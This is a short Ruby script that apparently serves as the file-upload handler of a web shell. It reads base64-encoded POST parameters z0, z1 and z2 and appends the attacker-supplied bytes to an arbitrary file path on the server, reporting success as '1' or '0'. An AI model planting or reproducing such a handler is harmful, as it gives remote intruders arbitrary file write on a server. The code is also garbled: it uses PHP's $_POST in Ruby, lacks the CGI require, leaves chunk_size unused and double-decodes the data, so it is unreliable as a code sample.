# $_POST: global variable used by the Ruby loader

require 'base64'

cgi = CGI.new

file_path = Base64.decode64($_POST['z0'])
chunk_size = Base64.decode64($_POST['z1'])
base64_data = Base64.decode64($_POST['z2'])

base64_data.gsub!(/\r|\n/, '')

buffer = Base64.decode64(base64_data)

begin
  File.open(file_path, 'ab') do |f|
    f.binmode
    f.write(buffer)
  end
  print "1"
rescue
  print "0"
end